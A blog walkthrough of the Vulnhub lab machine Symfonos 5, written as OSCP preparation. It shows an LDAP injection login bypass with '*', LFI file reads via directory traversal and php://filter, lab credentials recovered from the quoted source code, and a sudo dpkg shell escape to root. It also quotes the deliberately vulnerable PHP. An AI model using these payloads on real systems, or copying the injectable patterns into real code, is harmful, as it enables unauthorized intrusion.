+++
title = "Vulnhub: Symfonos 5"
date = "2021-02-17T21:54:20+03:00"
author = ""
authorTwitter = "" #do not include @
cover = ""
tags = ["Beginner", "Vulnhub", "OSCP Prep", "LDAP Injection", "LFI", "LDAP", "Sudo"]
keywords = ["", ""]
description = ""
showFullContent = false
+++

<!--more-->
{{< image src="/img/symfonos1/symfonos1.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

| Difficulty | Release Date | Author | 
| ---------- | ------------ | ------ | 
| Beginner | 2 Mar 2020 | Zayotic | 

# Summary

In this box, we first perform ldap injection on the web application to bypass the login page. Then we are able to read
local files by abusing a local file inclusion vulnerability with php base64 filter. From one of the php files we get
ldap credentials that we used to authenticate to ldap and dump entries. From the entries we get a base64 encoded 
password that we could use to ssh into the machine. For privilege escalation to a root shell we abused sudo permission granted on
dpkg.

# Reconnaissance

Nmap

```sh
Nmap scan report for 192.168.191.132
Host is up (0.0019s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey:
|   2048 16:70:13:77:22:f9:68:78:40:0d:21:76:c1:50:54:23 (RSA)
|   256 a8:06:23:d0:93:18:7d:7a:6b:05:77:8d:8b:c9:ec:02 (ECDSA)
|_  256 52:c0:83:18:f4:c7:38:65:5a:ce:97:66:f3:75:68:4c (ED25519)
80/tcp  open  http     Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
389/tcp open  ldap     OpenLDAP 2.2.X - 2.3.X
636/tcp open  ldapssl?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# Enumeration

## 389,636 (LDAP)

Doing some basic enumeration on ldap without credentials we only get the domain name. We'll probably
get back to it incase we land on some credentials.

**nmap scripts**:

```sh
nmap -p 389,636 --script ldap-* 192.168.191.132 
```
{{< image src="/img/symfonos5/symfonos5-2.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

**ldapsearch**:

```sh
ldapsearch -h 192.168.191.132 -D '' -w '' -b "DC=symfonos,DC=local" 
```

{{< image src="/img/symfonos5/symfonos5-3.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

## 80 (HTTP)

Opening the site on the browser, we only get a plain page with an image.

{{< image src="/img/symfonos5/symfonos5-4.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

Performing a directory/file bruteforce using ffuf, we discover new files.

```sh
ffuf -ic -c -u http://192.168.191.132/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e /,.php,.html -t 50 | tee root.ffuf
```
{{< image src="/img/symfonos5/symfonos5-1.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

Accessing /home.php we are redirected to admin.php which has a login form.

{{< image src="/img/symfonos5/symfonos5-5.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

I tried out credential bruteforce and sql injection auth bypass techniques but none of them were successful. I 
then thought to try out ldap injection. Since we have ldap running on this host it could be a valid path.

The application performs authentication insecurely by using GET requests to login.

{{< image src="/img/symfonos5/symfonos5-6.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

Setting the username and password to `*` we successfully login.

{{< image src="/img/symfonos5/symfonos5-7.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

We get redirected to home.php which doesn't have much, but clicking on portraits we see interesting functionality.

{{< image src="/img/symfonos5/symfonos5-8.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

The url parameter takes in a url, changing the input to `../../../../etc/passwd` we can read the passwd file. This confirms
we can abuse LFI to access other files on disk by directory traversal.

{{< image src="/img/symfonos5/symfonos5-9.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

I tried accessing log files to try for RCE like the previous boxes but nothing came up. We can still use this to read
files so we can check the source code of the app.

Accessing the php files directly just executes them, so we need to use php wrappers.

**home.php**

```
http://192.168.191.132/home.php?url=php://filter/convert.base64-encode/resource=home.php
```

```php
<?php
session_start();

if(!isset($_SESSION['loggedin'])){
        header("Location: admin.php");
        exit;
}

if (!empty($_GET["url"]))
{
$r = $_GET["url"];
$result = file_get_contents($r);
}

?>
<html>
<head>
<link rel="stylesheet" type="text/css" href="/static/bootstrap.min.css">
</head>
<body>
<nav class="navbar navbar-expand-lg navbar-dark bg-dark">
  <a class="navbar-brand" href="home.php">symfonos</a>
  <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarColor02" aria-controls="navbarColor02" aria-expanded="false" aria-label="Toggle navigation">
    <span class="navbar-toggler-icon"></span>
  </button>

  <div class="collapse navbar-collapse" id="navbarColor02">
    <ul class="navbar-nav mr-auto">
      <li class="nav-item">
        <a class="nav-link" href="home.php">Home</a>
      </li>
      <li class="nav-item">
        <a class="nav-link" href="home.php?url=http://127.0.0.1/portraits.php">Portraits</a>
      </li>
      <li class="nav-item">
        <a class="nav-link" href="logout.php">Logout</a>
      </li>
    </ul>
  </div>
</nav><br />
<center>
<?php
if ($result){
echo $result;
} else {
echo "<h3>Under Developement</h3>";
} ?>
</center>
</body>
```

**admin.php**

```
http://192.168.191.132/home.php?url=php://filter/convert.base64-encode/resource=admin.php
```

```php
<?php
session_start();

if(isset($_SESSION["loggedin"]) && $_SESSION["loggedin"] === true){
    header("location: home.php");
    exit;
}

function authLdap($username, $password) {
  $ldap_ch = ldap_connect("ldap://172.18.0.22");

  ldap_set_option($ldap_ch, LDAP_OPT_PROTOCOL_VERSION, 3);

  if (!$ldap_ch) {
    return FALSE;
  }

  $bind = ldap_bind($ldap_ch, "cn=admin,dc=symfonos,dc=local", "qMDdyZh3cT6eeAWD");

  if (!$bind) {
    return FALSE;
  }

  $filter = "(&(uid=$username)(userPassword=$password))";
  $result = ldap_search($ldap_ch, "dc=symfonos,dc=local", $filter);

  if (!$result) {
    return FALSE;
  }

  $info = ldap_get_entries($ldap_ch, $result);

  if (!($info) || ($info["count"] == 0)) {
    return FALSE;
  }

  return TRUE;

}

if(isset($_GET['username']) && isset($_GET['password'])){

$username = urldecode($_GET['username']);
$password = urldecode($_GET['password']);

$bIsAuth = authLdap($username, $password);

if (! $bIsAuth ) {
        $msg = "Invalid login";
} else {
        $_SESSION["loggedin"] = true;
        header("location: home.php");
        exit;
}
}
?>
<html>
<head>
<link rel="stylesheet" type="text/css" href="/static/bootstrap.min.css">
</head>
<body><br />
<div class="container">
  <div class="row justify-content-center">
    <div class="col-md-8">
      <div class="card">
        <div class="card-header">Login</div>
        <div class="card-body">
          <form action="admin.php" method="GET">
            <div class="form-group row">
                <label for="email_address" class="col-md-4 col-form-label text-md-right">Username</label>
                <div class="col-md-6">
                    <input type="text" id="username" class="form-control" name="username" required autofocus>
                </div>
            </div>

            <div class="form-group row">
                <label for="password" class="col-md-4 col-form-label text-md-right">Password</label>
                <div class="col-md-6">
                    <input type="password" id="password" class="form-control" name="password" required>
                </div>
            </div>

            <div class="col-md-6 offset-md-4">
                <button type="submit" class="btn btn-primary">
                    Login
                </button>
            </div>
          </form>
        </div>
  </div>
  <center><strong><?php echo $msg; ?></strong></center>
</div>
</body>
</html>
```
From admin.php we get credentials that can be used on ldap.

# Getting shell as zeus

With the credentials admin:qMDdyZh3cT6eeAWD, we get more output from ldap:

```sh
ldapsearch -x -h 192.168.191.132 -D "CN=admin,DC=symfonos,DC=local" -w qMDdyZh3cT6eeAWD -b "DC=symfonos,DC=local"
```

{{< image src="/img/symfonos5/symfonos5-10.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

From the output, the userPassword is base64 encoded. After decoding it we get `cetkKf4wCuHC9FET` and can login 
as zeus via ssh.

{{< image src="/img/symfonos5/symfonos5-11.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

# Privilege Escalation

Running `sudo -l`, we see that zeus has sudo permissions to run dpkg with no password.

{{< image src="/img/symfonos5/symfonos5-12.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

From [gtfobins](https://gtfobins.github.io/gtfobins/dpkg/) we only need to execute the below commands to
abuse this.

```sh
sudo dpkg -l
!/bin/bash
```

{{< image src="/img/symfonos5/symfonos5-13.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

# Extras

When accessing the passwd file, we couldn't see any user with home directory in /home looking at the configuration
postexploitation we see that the services are running in docker containers.

{{< image src="/img/symfonos5/symfonos5-14.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}
